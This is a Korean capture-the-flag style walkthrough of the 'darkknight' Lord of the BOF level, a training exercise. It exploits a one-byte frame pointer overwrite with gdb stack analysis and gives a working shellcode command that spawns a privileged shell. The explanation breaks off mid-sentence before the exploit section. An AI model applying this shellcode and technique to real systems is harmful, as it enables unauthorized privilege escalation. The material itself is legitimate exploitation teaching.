# Summary

**이전 문제와 동일한 내용은 생략하고 추가된 내용만 다루었다.**

> 문제의 소스코드

```c
[golem@localhost golem]$ cat darkknight.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/

#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}
```

> 문제의 소스코드에서 추가된 내용을 살펴보자

- `buffer`크기 `40Bytes` & strncpy 함수 `41Bytes` overwrite 
- `buffer` 뒤에 덮어 쓸 수 있는 주소 `1Byte`
- 힌트: FPO(Frame Pointer Overwrite)

<br>

FPO(Frame Pointer Overwrite)를 이용하는 문제이다.

<br>

# Analysis

`gdb` 분석을 위해 `tmp`디렉터리를 생성하여 원본 바이너리를 복사 후

함수 `problem_child`를 `disas(semble)`하여 브레이크 지점을 지정해준다.

여기서는 스택이 정리되는 [에필로그][epp]가 시작되기 전인 `leave`함수에 브레이크 포인트를 걸었다.

```python
[golem@localhost golem]$ mkdir tmp;cp darkknight tmp
[golem@localhost golem]$ cd tmp
[golem@localhost tmp]$ gdb -q darkknight
(gdb) set disassembly-flavor intel
(gdb) disas problem_child
Dump of assembler code for function problem_child:
0x8048440 <problem_child>:	push   %ebp
0x8048441 <problem_child+1>:	mov    %ebp,%esp
0x8048443 <problem_child+3>:	sub    %esp,40
0x8048446 <problem_child+6>:	push   41
0x8048448 <problem_child+8>:	mov    %eax,DWORD PTR [%ebp+8]
0x804844b <problem_child+11>:	push   %eax
0x804844c <problem_child+12>:	lea    %eax,[%ebp-40]
0x804844f <problem_child+15>:	push   %eax
0x8048450 <problem_child+16>:	call   0x8048374 <strncpy>
0x8048455 <problem_child+21>:	add    %esp,12
0x8048458 <problem_child+24>:	lea    %eax,[%ebp-40]
0x804845b <problem_child+27>:	push   %eax
0x804845c <problem_child+28>:	push   0x8048500
0x8048461 <problem_child+33>:	call   0x8048354 <printf>
0x8048466 <problem_child+38>:	add    %esp,8
0x8048469 <problem_child+41>:	leave
0x804846a <problem_child+42>:	ret
0x804846b <problem_child+43>:	nop
End of assembler dump.
(gdb) b*problem_child+41
Breakpoint 1 at 0x8048469
```

<br>

다음은 임의의 값으로 `NOP*40`을 버퍼에 덮어쓴 뒤 리턴 값을 덮을 1바이트에 특정 문자열 `aa`를 삽입해주고

프로그램을 실행해준 뒤 스택의 변화를 살펴보았다.

버퍼에 `NOP*40`과 `ret`부분에 0xbffffa**aa**가 정상적으로 덮어 씌워진 것을 확인할 수 있다.

```python
(gdb) r `python -c "print '\x90'*40+'\xaa'"`
Starting program: /home/golem/tmp/darkknight `python -c "print '\x90'*40+'\xaa'"`
���������������������������������������������%��������	@

Breakpoint 1, 0x8048469 in problem_child ()
(gdb) x/40w $esp-40
0xbffffa6c:	0xbffffa84	0x40066070	0x40106980	0x08048500
0xbffffa7c:	0xbffffa94	0x401081ec	0xbffffabc	0x08048466
0xbffffa8c:	0x08048500	0xbffffa94	0x90909090	0x90909090
0xbffffa9c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffaac:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffabc:	0xbffffaaa	0x0804849e	0xbffffc25	0xbffffae8
0xbffffacc:	0x400309cb	0x00000002	0xbffffb14	0xbffffb20
0xbffffadc:	0x40013868	0x00000002	0x08048390	0x00000000
0xbffffaec:	0x080483b1	0x0804846c	0x00000002	0xbffffb14
0xbffffafc:	0x080482e4	0x080484dc	0x4000ae60	0xbffffb0c
```

<br>

다음은 쉘코드를 버퍼에 삽입하여 쉘코드로 덮은 지점에 `ret`를 변경해보자.

현재 `ret`의 경우 1바이트만 조작이 가능하기 때문에 `0xbffffa__` 두자리 값을 변경하여 쉘코드를 실행시켜야 할 것이다.

여기서 알아둬야 할 점은 에필로그



# Exploit

```python
[golem@localhost golem]$ ./darkknight `python -c "print '\xb8\xfa\xff\xbf'+'\x90'*12+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'+'\xb0'"`
����������������1�Ph//shh/bin��PS�ᙰ
                                    ̀�����;������	@
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
bash$ my-pass
euid = 512
new attacker
```



[epp]: 